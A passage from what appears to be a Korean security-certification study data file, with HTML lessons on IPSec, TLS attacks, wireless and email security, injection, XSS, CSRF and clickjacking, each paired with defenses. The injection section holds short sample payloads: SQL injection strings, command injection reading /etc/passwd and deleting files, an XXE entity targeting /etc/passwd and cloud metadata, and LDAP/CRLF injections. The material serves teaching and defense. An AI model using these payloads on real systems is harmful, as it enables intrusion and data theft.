    <tr><td>헤더</td><td>원본 IP 헤더 유지</td><td>새 외부 IP 헤더 추가</td></tr>
    <tr><td>주요 용도</td><td>호스트 간 통신</td><td>게이트웨이 간 VPN</td></tr>
    <tr><td>오버헤드</td><td>적음</td><td>큼 (헤더 추가)</td></tr>
  </tbody>
</table>

<h3>IKE (Internet Key Exchange) 협상</h3>
<p>IPSec 터널 수립 전 키 교환 및 SA 협상 프로토콜. ISAKMP 프레임워크 기반. UDP 500 포트.</p>

<h4>IKEv1 2단계 협상</h4>
<ul>
  <li><strong>Phase 1 (ISAKMP SA)</strong>: 안전한 채널 수립을 위한 협상. Main Mode (6개 메시지, 안전) 또는 Aggressive Mode (3개 메시지, 빠르지만 취약). 결과: ISAKMP SA (양방향)</li>
  <li><strong>Phase 2 (IPSec SA)</strong>: Phase 1 채널 위에서 실제 데이터 보호용 SA 협상. Quick Mode. 결과: IPSec SA (단방향 2개 — 인바운드/아웃바운드)</li>
</ul>

<h4>IKEv2 개선사항</h4>
<ul>
  <li>4개 메시지로 터널 수립 (IKEv1보다 빠름)</li>
  <li>EAP 기반 인증 지원</li>
  <li>MOBIKE: IP 변경 시 세션 유지 (모바일 환경)</li>
  <li>DoS 방지: 쿠키 메커니즘</li>
</ul>

<h3>SA (Security Association)</h3>
<p>IPSec 통신의 단방향 보안 관계. 암호화 알고리즘·키·SPI(Security Parameter Index)·수명 등 포함.</p>
<ul>
  <li><strong>SAD (SA Database)</strong>: 현재 활성화된 SA 목록</li>
  <li><strong>SPD (Security Policy Database)</strong>: 트래픽에 어떤 SA를 적용할지 정책 정의</li>
  <li>양방향 통신에 SA 2개 필요 (인바운드 + 아웃바운드)</li>
</ul>

<h3>PFS (Perfect Forward Secrecy, 완전 순방향 비밀성)</h3>
<p>세션마다 새로운 임시 DH 키 생성. 장기 개인키가 유출되어도 과거 세션 복호화 불가. IPSec Phase 2에서 PFS 활성화 시 매 SA 재협상마다 새 DH 교환.</p>

<h3>SSL VPN 유형</h3>
<table>
  <thead><tr><th>유형</th><th>설명</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>클라이언트리스</strong></td><td>웹 브라우저만으로 접근. 포털 방식.</td><td>별도 소프트웨어 불필요. 웹 기반 앱만 지원.</td></tr>
    <tr><td><strong>씬 클라이언트</strong></td><td>브라우저 플러그인 또는 Java 앱렛.</td><td>TCP 기반 앱 지원 확장.</td></tr>
    <tr><td><strong>터널 모드</strong></td><td>전용 클라이언트 소프트웨어 설치.</td><td>전체 네트워크 접근. IPSec VPN과 유사한 경험.</td></tr>
  </tbody>
</table>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'tls-ssl',
    chapterLabel: 'TLS·SSL',
    keywords: ['TLS', 'SSL', 'HTTPS', 'handshake', 'Certificate', 'Cipher Suite', 'PFS', '완전 순방향 비밀성', 'BEAST', 'POODLE', 'Heartbleed', 'DROWN', 'FREAK', 'HSTS', 'OCSP Stapling', 'CT'],
    content: `

<h3>SSL/TLS 버전 역사 및 보안 현황</h3>
<table>
  <thead><tr><th>버전</th><th>출시</th><th>상태</th><th>주요 취약점</th></tr></thead>
  <tbody>
    <tr><td>SSL 2.0</td><td>1995</td><td>사용 금지 (RFC 6176)</td><td>DROWN, 다수의 구조적 취약점</td></tr>
    <tr><td>SSL 3.0</td><td>1996</td><td>사용 금지 (RFC 7568)</td><td>POODLE</td></tr>
    <tr><td>TLS 1.0</td><td>1999</td><td>사용 금지 (RFC 8996, 2021)</td><td>BEAST, POODLE (SSL 폴백)</td></tr>
    <tr><td>TLS 1.1</td><td>2006</td><td>사용 금지 (RFC 8996, 2021)</td><td>BEAST 일부 완화, 여전히 취약</td></tr>
    <tr><td>TLS 1.2</td><td>2008</td><td>권장 (설정에 따라 안전)</td><td>RC4, 약한 암호 스위트 사용 시 취약</td></tr>
    <tr><td>TLS 1.3</td><td>2018</td><td>권장 (최신)</td><td>알려진 주요 취약점 없음</td></tr>
  </tbody>
</table>

<h3>TLS 1.2 Handshake 흐름</h3>
<pre><code>클라이언트                              서버
    |                                    |
    |--- ClientHello ------------------->|  (지원 암호 스위트, 난수, 세션 ID)
    |&lt;-- ServerHello --------------------|  (선택된 암호 스위트, 난수)
    |&lt;-- Certificate --------------------|  (서버 인증서)
    |&lt;-- ServerKeyExchange (선택적) ------|  (DHE/ECDHE 파라미터)
    |&lt;-- ServerHelloDone ----------------|
    |--- ClientKeyExchange ------------->|  (Pre-master secret 또는 DH 공개키)
    |--- ChangeCipherSpec -------------->|
    |--- Finished (암호화됨) ----------->|
    |&lt;-- ChangeCipherSpec ---------------|
    |&lt;-- Finished (암호화됨) ------------|
    |                                    |
    |===== 암호화된 통신 시작 ============|</code></pre>

<h3>TLS 1.3 개선사항</h3>
<ul>
  <li><strong>1-RTT Handshake</strong>: TLS 1.2의 2-RTT에서 1-RTT로 단축</li>
  <li><strong>0-RTT</strong>: 세션 재개 시 0-RTT (Early Data). 재전송 공격 위험 있음.</li>
  <li><strong>취약 알고리즘 제거</strong>: RC4, DES, 3DES, MD5, SHA-1, RSA 키 교환, 정적 DH 제거</li>
  <li><strong>PFS 필수</strong>: DHE 또는 ECDHE만 허용 (정적 RSA 키 교환 제거)</li>
  <li><strong>암호화된 핸드셰이크</strong>: Certificate 등 핸드셰이크 메시지 암호화</li>
</ul>

<h3>Cipher Suite 표기법</h3>
<pre><code>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
 |    |      |        |    |   |   |
 |    |      |        |    |   |   +-- MAC 알고리즘 (SHA384)
 |    |      |        |    |   +------ 암호화 모드 (GCM)
 |    |      |        |    +---------- 키 길이 (256bit)
 |    |      |        +--------------- 대칭키 알고리즘 (AES)
 |    |      +------------------------ 인증 알고리즘 (RSA 서명)
 |    +------------------------------ 키 교환 알고리즘 (ECDHE)
 +----------------------------------- 프로토콜 (TLS)</code></pre>

<h3>PFS (Perfect Forward Secrecy)</h3>
<p>세션마다 임시 DH 키 쌍(Ephemeral Key)을 생성하여 키 교환. 장기 개인키 유출로도 과거 세션 복호화 불가.</p>
<ul>
  <li><strong>DHE</strong>: Ephemeral Diffie-Hellman (고정 파라미터, 느림)</li>
  <li><strong>ECDHE</strong>: Elliptic Curve DHE (타원곡선 기반, 더 빠르고 강력)</li>
  <li>TLS 1.3에서는 ECDHE/DHE만 허용 (PFS 필수)</li>
</ul>

<h3>주요 TLS 공격</h3>
<table>
  <thead><tr><th>공격</th><th>취약점</th><th>원인</th><th>대응</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>BEAST</strong></td>
      <td>TLS 1.0 이하</td>
      <td>CBC 모드의 예측 가능한 IV → 선택 평문 공격</td>
      <td>TLS 1.1+ 사용, RC4(금지됨)</td>
    </tr>
    <tr>
      <td><strong>POODLE</strong></td>
      <td>SSL 3.0</td>
      <td>CBC 패딩 오라클. TLS→SSL 3.0 다운그레이드 강제.</td>
      <td>SSL 3.0 비활성화, TLS_FALLBACK_SCSV</td>
    </tr>
    <tr>
      <td><strong>DROWN</strong></td>
      <td>SSL 2.0 활성화 서버</td>
      <td>SSL 2.0 Export 암호화로 TLS 세션키 복호화</td>
      <td>SSL 2.0 완전 비활성화</td>
    </tr>
    <tr>
      <td><strong>Heartbleed</strong></td>
      <td>OpenSSL 1.0.1~1.0.1f</td>
      <td>HeartBeat 확장 메모리 경계 검사 누락 → 64KB 메모리 노출</td>
      <td>OpenSSL 패치 (1.0.1g+), 키 재발급</td>
    </tr>
    <tr>
      <td><strong>FREAK</strong></td>
      <td>Export 암호화 지원 서버</td>
      <td>512bit RSA Export 키로 다운그레이드 강제 → 인수분해 가능</td>
      <td>Export 암호 스위트 비활성화</td>
    </tr>
    <tr>
      <td><strong>LOGJAM</strong></td>
      <td>512bit DH 파라미터</td>
      <td>Export DHE로 다운그레이드 강제 → 이산 로그 계산</td>
      <td>2048bit+ DH, ECDHE 사용</td>
    </tr>
  </tbody>
</table>

<h3>TLS 보안 강화 기술</h3>
<ul>
  <li><strong>HSTS (HTTP Strict Transport Security)</strong>: 브라우저에 특정 도메인은 항상 HTTPS로만 접속하도록 강제. SSL Stripping 방어. <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code></li>
  <li><strong>CT (Certificate Transparency)</strong>: 모든 인증서를 공개 로그 서버에 기록. 불법 발급 인증서 탐지.</li>
  <li><strong>OCSP Stapling</strong>: 서버가 OCSP 응답을 미리 가져와 클라이언트에 전달. 인증서 폐기 확인 성능 향상. OCSP 서버 프라이버시 보호.</li>
  <li><strong>Certificate Pinning</strong>: 특정 인증서 또는 공개키만 신뢰. MITM 방어. 유연성 감소.</li>
</ul>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'wireless-security',
    chapterLabel: '무선 네트워크 보안',
    keywords: ['WEP', 'WPA', 'WPA2', 'WPA3', '802.11', 'EAP', 'RADIUS', '무선랜', 'AP', 'SSID', '이블트윈', '워드라이빙', '디어센티케이션', 'WPS', 'KRACK', 'PMKID'],
    content: `

<h3>무선 보안 표준 비교</h3>
<table>
  <thead><tr><th>표준</th><th>제정</th><th>암호화</th><th>인증</th><th>키 관리</th><th>주요 취약점</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>WEP</strong></td>
      <td>1997</td>
      <td>RC4 (40/104bit)</td>
      <td>Open/Shared Key</td>
      <td>정적 키</td>
      <td>IV 재사용, FMS 공격, 24bit IV (약 5000패킷 후 재사용)</td>
    </tr>
    <tr>
      <td><strong>WPA</strong></td>
      <td>2003</td>
      <td>TKIP (RC4 기반)</td>
      <td>PSK / 802.1X</td>
      <td>동적 키 (TKIP)</td>
      <td>TKIP 취약점, RC4 근본 취약점</td>
    </tr>
    <tr>
      <td><strong>WPA2</strong></td>
      <td>2004</td>
      <td>CCMP (AES-128)</td>
      <td>PSK / 802.1X</td>
      <td>4-way Handshake (PTK 생성)</td>
      <td>KRACK, PMKID 공격, PSK 무차별 대입</td>
    </tr>
    <tr>
      <td><strong>WPA3</strong></td>
      <td>2018</td>
      <td>GCMP-256 (개인)/CCMP-128(개인)</td>
      <td>SAE / 802.1X</td>
      <td>SAE (Dragonfly), 192bit 기업모드</td>
      <td>Dragonblood (초기 구현 취약점, 패치됨)</td>
    </tr>
  </tbody>
</table>

<h3>WEP 취약점</h3>
<ul>
  <li><strong>IV (Initialization Vector) 재사용</strong>: 24bit IV는 약 5,000~16,000,000개 패킷 후 반드시 재사용. 동일 IV + 동일 키 → RC4 키스트림 노출.</li>
  <li><strong>FMS 공격 (Fluhrer-Mantin-Shamir)</strong>: 특정 취약 IV를 수집하여 RC4 키 복구. AirSnort, Aircrack-ng 도구로 실용적 공격 가능.</li>
  <li><strong>결론</strong>: WEP는 완전히 깨진 프로토콜. 즉시 사용 중단 필요.</li>
</ul>

<h3>WPA2 취약점</h3>
<ul>
  <li><strong>KRACK (Key Reinstallation Attack, 2017)</strong>: 4-way Handshake의 3번째 메시지 재전송을 유발하여 nonce 재사용. CCMP 키스트림 재사용 → 복호화 가능. WPA2의 구현 취약점 (프로토콜 자체는 안전).</li>
  <li><strong>PMKID 공격 (2018)</strong>: AP가 클라이언트에 보내는 PMKID 값을 캡처하여 오프라인 PSK 무차별 대입. 핸드셰이크 완료 없이 공격 가능.</li>
  <li><strong>PSK 무차별 대입</strong>: 4-way Handshake 캡처 후 오프라인으로 패스워드 추측.</li>
</ul>

<h3>WPA3 개선사항</h3>
<ul>
  <li><strong>SAE (Simultaneous Authentication of Equals, Dragonfly)</strong>: PSK 대신 상호 인증 기반 키 합의. 오프라인 사전 공격 불가. PFS 지원.</li>
  <li><strong>OWE (Opportunistic Wireless Encryption)</strong>: 개방형 네트워크에서도 암호화. 인증 없이 기밀성 제공.</li>
  <li><strong>192bit 보안 모드</strong>: 기업 환경용. GCMP-256 암호화. CNSA 스위트 기반.</li>
  <li><strong>PMF (Protected Management Frames)</strong>: 관리 프레임 암호화. Deauthentication 공격 방어.</li>
</ul>

<h3>무선 랜 공격 유형</h3>
<table>
  <thead><tr><th>공격</th><th>원리</th><th>대응</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>Evil Twin (이블트윈)</strong></td>
      <td>합법적 AP와 동일한 SSID로 가짜 AP 구동 → 피해자 연결 유도 → MITM</td>
      <td>기업망 802.1X, 인증서 검증, VPN</td>
    </tr>
    <tr>
      <td><strong>Wardriving (워드라이빙)</strong></td>
      <td>차량으로 이동하며 무선 AP를 스캔하고 취약 네트워크 탐색</td>
      <td>WPA3, 강력한 암호화</td>
    </tr>
    <tr>
      <td><strong>Deauthentication 공격</strong></td>
      <td>위조된 Deauthentication 프레임으로 클라이언트 강제 연결 해제 → Evil Twin 유도 또는 DoS</td>
      <td>WPA3 PMF (Protected Management Frames)</td>
    </tr>
    <tr>
      <td><strong>WPS 취약점</strong></td>
      <td>WPS PIN의 반쪽 검증 방식으로 약 11,000번의 시도로 PIN 유출 → PSK 획득</td>
      <td>WPS 비활성화</td>
    </tr>
  </tbody>
</table>

<h3>기업망 무선 인증: 802.1X + EAP + RADIUS</h3>
<p>WPA2/WPA3 Enterprise 모드. PSK 대신 개인 계정으로 인증. 구성요소:</p>
<ul>
  <li><strong>Supplicant</strong>: 인증을 요청하는 클라이언트 단말</li>
  <li><strong>Authenticator</strong>: 인증을 중계하는 AP (EAP over LAN)</li>
  <li><strong>Authentication Server</strong>: 인증을 처리하는 RADIUS 서버</li>
</ul>

<h3>EAP 유형 비교</h3>
<table>
  <thead><tr><th>유형</th><th>서버 인증</th><th>클라이언트 인증</th><th>보안</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>EAP-TLS</strong></td><td>서버 인증서</td><td>클라이언트 인증서</td><td>매우 강력</td><td>상호 인증. 인증서 관리 부담.</td></tr>
    <tr><td><strong>EAP-TTLS</strong></td><td>서버 인증서</td><td>ID/PW (TLS 터널 내)</td><td>강력</td><td>클라이언트 인증서 불필요.</td></tr>
    <tr><td><strong>PEAP</strong></td><td>서버 인증서</td><td>MS-CHAPv2 (TLS 터널 내)</td><td>강력</td><td>Microsoft 환경에 일반적. TLS 터널 보호.</td></tr>
    <tr><td><strong>EAP-FAST</strong></td><td>PAC (Protected Access Credential)</td><td>PAC</td><td>중간</td><td>인증서 없이 PAC 사용. Cisco 개발.</td></tr>
  </tbody>
</table>
    `,
  },

  {
    subject: 'network',
    subjectLabel: '네트워크보안',
    chapter: 'email-security',
    chapterLabel: '이메일 보안',
    keywords: ['SPF', 'DKIM', 'DMARC', 'SMTP', 'POP3', 'IMAP', 'S/MIME', 'PGP', '피싱', '스팸', 'MX 레코드', 'STARTTLS', '헤더 위조', 'TXT 레코드'],
    content: `

<h3>이메일 프로토콜</h3>
<table>
  <thead><tr><th>프로토콜</th><th>포트</th><th>역할</th><th>보안 버전</th></tr></thead>
  <tbody>
    <tr><td>SMTP</td><td>25</td><td>메일 서버 간 전송 (MTA to MTA)</td><td>SMTPS (465), STARTTLS (587)</td></tr>
    <tr><td>SMTP Submission</td><td>587</td><td>클라이언트 → 서버 제출 (STARTTLS)</td><td>기본 STARTTLS</td></tr>
    <tr><td>POP3</td><td>110</td><td>메일 수신 후 서버에서 삭제</td><td>POP3S (995)</td></tr>
    <tr><td>IMAP</td><td>143</td><td>메일 수신, 서버 유지·동기화</td><td>IMAPS (993)</td></tr>
    <tr><td>SMTPS</td><td>465</td><td>처음부터 TLS로 연결 (Implicit TLS)</td><td>—</td></tr>
  </tbody>
</table>

<h3>이메일 발신자 인증 기술</h3>

<h4>SPF (Sender Policy Framework)</h4>
<p>도메인 소유자가 허가된 발신 메일 서버 IP 목록을 DNS TXT 레코드에 등록. 수신 MTA가 발신 IP와 대조하여 위조 탐지.</p>
<pre><code>TXT "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com ~all"
                |              |                               |
           허가된 IP 대역   서드파티 포함              SoftFail (스팸 처리)</code></pre>
<ul>
  <li><code>+all</code>: Pass (모두 허용 — 비권장)</li>
  <li><code>~all</code>: SoftFail (비허가 IP는 스팸 처리)</li>
  <li><code>-all</code>: Fail (비허가 IP는 거부)</li>
  <li>한계: 전달(Forwarding) 시 원본 IP 변경으로 검증 실패</li>
</ul>

<h4>DKIM (DomainKeys Identified Mail)</h4>
<p>발신 서버가 개인키로 메일 헤더·본문에 디지털 서명. 수신자가 DNS에서 공개키를 조회하여 서명 검증. 메일 무결성·발신자 인증.</p>
<pre><code>DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1;
                h=from:to:subject:date; bh=BASE64_BODY_HASH; b=BASE64_SIGNATURE</code></pre>
<ul>
  <li>전달(Forwarding) 시에도 서명 유지 (SPF 단점 보완)</li>
  <li>단, 본문 수정 시 서명 무효화</li>
</ul>

<h4>DMARC (Domain-based Message Authentication, Reporting and Conformance)</h4>
<p>SPF·DKIM 검증 결과에 따른 처리 정책 정의 + 보고서 수신.</p>
<pre><code>TXT "_dmarc.example.com" "v=DMARC1; p=quarantine; rua=mailto:dmarc@example.com; pct=100"</code></pre>
<table>
  <thead><tr><th>정책 (p=)</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>none</strong></td><td>모니터링만. 메일 처리에 영향 없음. 초기 배포 시 사용.</td></tr>
    <tr><td><strong>quarantine</strong></td><td>SPF/DKIM 실패 메일을 스팸 폴더로 격리.</td></tr>
    <tr><td><strong>reject</strong></td><td>SPF/DKIM 실패 메일을 완전 거부.</td></tr>
  </tbody>
</table>

<h3>이메일 암호화: S/MIME vs PGP</h3>
<table>
  <thead><tr><th>항목</th><th>S/MIME</th><th>PGP (Pretty Good Privacy)</th></tr></thead>
  <tbody>
    <tr><td>신뢰 모델</td><td>PKI (CA 기반 계층 신뢰)</td><td>Web of Trust (사용자 간 상호 서명)</td></tr>
    <tr><td>인증서</td><td>X.509 인증서 (CA 발급)</td><td>PGP 키 쌍 (자체 생성)</td></tr>
    <tr><td>표준</td><td>RFC 5751 (MIME 기반)</td><td>RFC 4880 (OpenPGP)</td></tr>
    <tr><td>기업 환경</td><td>적합 (PKI 인프라 활용)</td><td>개인·오픈소스 환경</td></tr>
    <tr><td>구현</td><td>Outlook, Thunderbird 기본 지원</td><td>GPG (GNU Privacy Guard)</td></tr>
    <tr><td>제공 보안</td><td>기밀성, 무결성, 인증, 부인방지</td><td>기밀성, 무결성, 인증, 부인방지</td></tr>
  </tbody>
</table>

<h3>이메일 공격 유형</h3>
<table>
  <thead><tr><th>공격</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>피싱 (Phishing)</strong></td><td>불특정 다수 대상. 위조된 발신자로 악성 링크·첨부파일 전송.</td></tr>
    <tr><td><strong>스피어피싱 (Spear Phishing)</strong></td><td>특정 개인·조직 타깃. 개인화된 내용으로 신뢰도 높임.</td></tr>
    <tr><td><strong>웨일링 (Whaling)</strong></td><td>CEO·임원 등 고위직 타깃 스피어피싱.</td></tr>
    <tr><td><strong>스팸 (Spam)</strong></td><td>대량 발송 광고·악성 메일.</td></tr>
    <tr><td><strong>헤더 위조</strong></td><td>From 주소를 위조하여 신뢰할 수 있는 발신자로 가장. SPF·DKIM·DMARC로 대응.</td></tr>
    <tr><td><strong>이메일 봄베이딩</strong></td><td>대량 메일로 받은 편지함 마비 → 중요 알림 놓치게 유도.</td></tr>
  </tbody>
</table>

<h3>STARTTLS vs SMTPS</h3>
<table>
  <thead><tr><th>구분</th><th>STARTTLS</th><th>SMTPS (Implicit TLS)</th></tr></thead>
  <tbody>
    <tr><td>포트</td><td>25 (MTA간) / 587 (클라이언트 제출)</td><td>465</td></tr>
    <tr><td>동작</td><td>평문으로 시작 후 STARTTLS 명령으로 TLS 업그레이드 (Opportunistic TLS)</td><td>연결 즉시 TLS 시작</td></tr>
    <tr><td>다운그레이드 위험</td><td>있음 (MITM이 STARTTLS 차단 가능)</td><td>없음</td></tr>
    <tr><td>권장</td><td>587 포트에서 STARTTLS 강제 권장</td><td>보안 측면에서 더 안전</td></tr>
  </tbody>
</table>

<h3>메일 수신 시 SPF-DKIM-DMARC 검증 흐름</h3>
<pre><code>메일 수신 MTA
    |
    +-- [1] SPF 검증: 발신 IP가 DNS TXT(SPF) 레코드에 있는가?
    |
    +-- [2] DKIM 검증: DKIM-Signature 헤더의 서명이 DNS 공개키로 검증되는가?
    |
    +-- [3] DMARC 정책 적용:
            - SPF 또는 DKIM 중 하나라도 통과 + 도메인 정렬(Alignment) 확인
            - p=none: 통과
            - p=quarantine: 스팸 폴더 격리
            - p=reject: 메일 거부
    |
    +-- [4] DMARC 보고서 발송: rua(집계), ruf(포렌식) 주소로 보고서 전송</code></pre>
    `,
  },

  // ===== 어플리케이션보안 =====
  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'web-injection',
    chapterLabel: '웹 인젝션 공격',
    keywords: ['SQL Injection', 'SQL 인젝션', 'Blind SQL Injection', 'Union-based', 'Error-based', 'Time-based', 'OS Command Injection', 'LDAP Injection', 'XML Injection', 'XXE', 'Prepared Statement', '바인딩 변수', 'ORM', '입력값 검증'],
    content: `

<h3>SQL Injection 공격 원리</h3>
<p>입력값에 SQL 구문을 삽입해 DB를 비정상 조작하는 공격. 인증 우회·데이터 유출·변조·삭제 가능.</p>
<pre><code>-- 인증 우회: WHERE 조건 항상 참
ID 입력: admin'--
쿼리: SELECT * FROM users WHERE id='admin'--' AND pw='...'

-- UNION 기반: 타 테이블 데이터 추출
' UNION SELECT username, password FROM admin--</code></pre>

<h4>SQL Injection 유형 비교</h4>
<table>
  <thead><tr><th>유형</th><th>공격 흐름</th><th>특징</th><th>방어</th></tr></thead>
  <tbody>
    <tr><td><strong>Union-based</strong></td><td>UNION SELECT로 타 테이블 데이터를 응답에 포함</td><td>결과가 화면에 직접 출력될 때 유효</td><td>Prepared Statement, WAF</td></tr>
    <tr><td><strong>Error-based</strong></td><td>오류 메시지에서 DB 구조·데이터 추출</td><td>오류 메시지 노출 시 유효</td><td>오류 메시지 비노출</td></tr>
    <tr><td><strong>Blind (Boolean)</strong></td><td>참/거짓 응답 차이로 1비트씩 정보 추출</td><td>응답 내용 달라야 함. 느림.</td><td>응답 일관성 유지</td></tr>
    <tr><td><strong>Blind (Time-based)</strong></td><td>SLEEP()·WAITFOR DELAY로 지연 발생시켜 추출</td><td>응답 내용 동일해도 가능</td><td>쿼리 실행 시간 제한</td></tr>
    <tr><td><strong>Out-of-band</strong></td><td>DNS·HTTP 채널로 결과 외부 전송</td><td>방화벽 우회 가능</td><td>외부 통신 차단</td></tr>
  </tbody>
</table>

<h4>SQL Injection 방어</h4>
<table>
  <thead><tr><th>방어 기법</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>Prepared Statement (바인딩 변수)</strong></td><td>SQL 구조와 데이터를 분리. 입력값이 쿼리 구조를 변경 불가.</td></tr>
    <tr><td><strong>저장 프로시저</strong></td><td>DB에 사전 정의된 프로시저만 호출. 동적 SQL 최소화.</td></tr>
    <tr><td><strong>입력값 검증</strong></td><td>화이트리스트 기반 검증. 특수문자 이스케이프.</td></tr>
    <tr><td><strong>최소 권한 DB 계정</strong></td><td>애플리케이션 계정에 필요한 권한만 부여. DROP·CREATE 금지.</td></tr>
    <tr><td><strong>ORM 사용</strong></td><td>동적 SQL 대신 ORM 쿼리빌더 활용. SQL 직접 작성 최소화.</td></tr>
  </tbody>
</table>

<h3>OS Command Injection</h3>
<p>OS 명령을 실행하는 함수에 세미콜론(;), 파이프(|), 앰퍼샌드(&amp;) 등으로 추가 명령 삽입.</p>
<pre><code>입력: 127.0.0.1; cat /etc/passwd
코드: system("ping " + input)
실행: ping 127.0.0.1; cat /etc/passwd    &lt;-- 추가 명령 실행

파이프 예: 127.0.0.1 | whoami
앤드 예:   127.0.0.1 &amp;&amp; rm -rf /tmp/data</code></pre>
<p><strong>방어</strong>: OS 명령 실행 함수 사용 금지, 불가피 시 화이트리스트 입력만 허용, escapeshellarg() 적용.</p>

<h3>XXE (XML External Entity)</h3>
<p>DOCTYPE ENTITY 선언으로 외부 엔티티를 참조해 서버 내부 파일 읽기, SSRF 유발.</p>
<pre><code>&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;

-- SSRF 예시
&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</code></pre>
<p><strong>방어</strong>: XML 파서에서 external entity 처리 비활성화, DTD 비활성화, 안전한 XML 라이브러리 사용.</p>

<h3>LDAP Injection</h3>
<p>LDAP 필터 구문에 악성 입력을 삽입해 인증 우회·정보 유출.</p>
<pre><code>정상 필터: (&amp;(uid=alice)(password=secret))
공격 입력: alice)(|(uid=*
결과 필터: (&amp;(uid=alice)(|(uid=*)(password=x))</code></pre>
<p><strong>방어</strong>: 특수문자(* ( ) \ NUL) 이스케이프, 입력값 화이트리스트 검증.</p>

<h3>Header Injection (CRLF Injection)</h3>
<p>HTTP 응답 헤더에 개행 문자(CR: %0d, LF: %0a)를 삽입해 헤더를 조작하거나 응답을 분리(HTTP Response Splitting).</p>
<pre><code>입력: value%0d%0aSet-Cookie:%20session=attacker
결과 헤더:
  X-Custom: value
  Set-Cookie: session=attacker</code></pre>
<p><strong>방어</strong>: 응답 헤더 값에 CR·LF 문자 포함 여부 검증·제거.</p>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'web-xss-csrf',
    chapterLabel: 'XSS·CSRF',
    keywords: ['XSS', 'Cross-Site Scripting', '저장형 XSS', '반사형 XSS', 'DOM 기반 XSS', 'CSRF', 'Cross-Site Request Forgery', 'Clickjacking', 'CSP', 'Content Security Policy', 'SameSite', 'CSRF 토큰', 'HttpOnly', 'X-Frame-Options'],
    content: `

<h3>XSS (Cross-Site Scripting) 유형 비교</h3>
<p>악성 스크립트를 웹 페이지에 삽입해 다른 사용자 브라우저에서 실행. 쿠키 탈취·키로깅·피싱·페이지 변조.</p>
<table>
  <thead><tr><th>유형</th><th>공격 흐름</th><th>영향</th><th>핵심 방어</th></tr></thead>
  <tbody>
    <tr><td><strong>저장형 (Stored)</strong></td><td>악성 스크립트를 DB에 저장 → 다른 사용자 페이지 로드 시 실행</td><td>불특정 다수 피해. 지속적.</td><td>저장 전 입력 검증, 출력 인코딩</td></tr>
    <tr><td><strong>반사형 (Reflected)</strong></td><td>URL 파라미터에 스크립트 삽입 → 서버가 그대로 응답에 반사</td><td>피싱 링크로 특정 피해자 유도</td><td>출력 인코딩, CSP</td></tr>
    <tr><td><strong>DOM 기반 (DOM-based)</strong></td><td>서버 응답 무관. JS가 URL 해시(#)·파라미터를 DOM에 직접 삽입</td><td>서버 측 로그에 안 남음. 탐지 어려움.</td><td>innerHTML 대신 textContent 사용</td></tr>
  </tbody>
</table>

<h4>XSS 방어</h4>
<ul>
  <li><strong>출력 인코딩</strong>: HTML 엔티티 변환 — &lt; → &amp;lt; / &gt; → &amp;gt; / &amp; → &amp;amp; / &quot; → &amp;quot;</li>
  <li><strong>CSP (Content Security Policy)</strong>: script-src 'self' 로 외부 스크립트 차단. nonce 방식으로 인라인 스크립트 제어.</li>
  <li><strong>HttpOnly 쿠키</strong>: JavaScript에서 쿠키 접근 불가 → XSS로 세션 탈취 방지.</li>
  <li><strong>입력 검증</strong>: 서버 측 화이트리스트 기반 검증. 허용 태그 외 제거(DOMPurify 등).</li>
</ul>

<h3>CSRF (Cross-Site Request Forgery)</h3>
<p>인증된 사용자의 브라우저를 이용해 의도하지 않은 요청을 서버에 전송. 서버는 세션 쿠키 기반으로 정상 요청으로 처리.</p>
<pre><code>공격 시나리오:
1. 피해자: 은행 사이트 로그인 (세션 쿠키 보유)
2. 공격자: 악성 페이지에 아래 태그 삽입
   &lt;img src="https://bank.com/transfer?to=attacker&amp;amount=1000000"&gt;
3. 피해자: 악성 페이지 방문 → 브라우저가 자동으로 이체 요청 (쿠키 자동 전송)
4. 서버: 정상 요청으로 처리 → 이체 완료</code></pre>

<p><strong>XSS vs CSRF 차이</strong>: XSS는 사용자(클라이언트)를 직접 공격, CSRF는 서버를 공격(사용자를 매개로 이용).</p>

<h4>CSRF 방어</h4>
<table>
  <thead><tr><th>방어 기법</th><th>원리</th></tr></thead>
  <tbody>
    <tr><td><strong>CSRF 토큰</strong></td><td>서버가 세션마다 고유 토큰 발급 → 요청 시 토큰 검증. 공격자는 토큰 모름.</td></tr>
    <tr><td><strong>SameSite 쿠키</strong></td><td>SameSite=Strict/Lax: 크로스 사이트 요청에 쿠키 미전송.</td></tr>
    <tr><td><strong>Referer/Origin 검증</strong></td><td>요청 헤더의 출처가 자사 도메인인지 확인.</td></tr>
    <tr><td><strong>Double Submit Cookie</strong></td><td>쿠키와 요청 파라미터에 동일 랜덤 값 → 양쪽 일치 여부 검증.</td></tr>
  </tbody>
</table>

<h3>Clickjacking</h3>
<p>공격자 사이트가 투명한 iframe으로 정상 사이트를 겹쳐 표시. 피해자가 의도하지 않은 클릭을 정상 사이트에 전달.</p>
<pre><code>&lt;!-- 공격자 페이지 --&gt;
&lt;iframe src="https://victim.com/transfer" style="opacity:0; position:absolute; top:0; left:0;"&gt;&lt;/iframe&gt;
&lt;button style="position:absolute; top:0; left:0;"&gt;경품 받기&lt;/button&gt;</code></pre>

<h4>Clickjacking 방어</h4>
<ul>
  <li><strong>X-Frame-Options: DENY</strong> — 어떤 사이트의 iframe에도 포함 불가</li>
  <li><strong>X-Frame-Options: SAMEORIGIN</strong> — 같은 도메인의 iframe만 허용</li>
  <li><strong>CSP frame-ancestors</strong>: <code>Content-Security-Policy: frame-ancestors 'none'</code> (더 유연한 최신 방식)</li>
</ul>
    `,
  },

  {
    subject: 'application',
